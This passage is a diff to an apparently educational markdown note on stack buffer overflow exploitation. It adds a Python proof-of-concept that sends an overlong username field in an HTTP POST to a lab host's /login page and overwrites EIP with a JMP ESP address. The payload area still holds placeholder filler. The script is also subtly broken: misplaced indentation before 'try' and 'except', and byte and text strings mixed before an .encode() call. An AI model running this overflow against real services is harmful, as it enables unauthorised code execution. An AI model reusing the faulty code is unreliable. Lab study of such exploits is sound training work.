@@ -254,5 +254,50 @@ We have now found out JMP ESP instruction.
 First, we set a breakpoint (F2) on the JMP ESP instruction we have just found in order to follow the execution of the instruction. We now let the application run.
 ![[Pasted image 20220713143634.png]]
 
-We then update the eip variable in our exploit to point to 0x10090c83, due to little endianess we must place the address in reverse order.
-`eip = "\x83\x0c\x09\x10"`
+We then update the eip variable in our exploit to point to 0x10090c83, due to little endianess we must place the address in reverse order. The exploit being used will look like this:
+```python
+#!/usr/bin/python
+
+import socket
+
+ try:
+	print("\nAttempting to send buffer...")
+
+	filler = "A" * 780
+	eip = "\x83\x0c\x09\x10"
+	offset = "C" * 4
+	buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
+
+	inputBuffer = filler + eip + offset + buffer
+
+
+
+	content = b"username=" + inputBuffer + b"&password=A"
+
+
+	buffer = "POST /login HTTP/1.1\r\n"
+	buffer += "Host: 192.168.233.10\r\n"
+	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+	buffer += "Referer: http://192.168.233.10/login\r\n"
+	buffer += "Connection: close\r\n"
+	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+	buffer += "Content-Length: "+str(len(content))+"\r\n"
+	buffer += "\r\n"
+	  
+	buffer += content
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	  
+	s.connect(("192.168.233.10", 80))
+	encoded = buffer.encode()
+	s.send(encoded)
+		  
+	s.close()
+
+	print("\nSuccess!")
+
+ except:
+ 	print("\nCould not connect")
+```
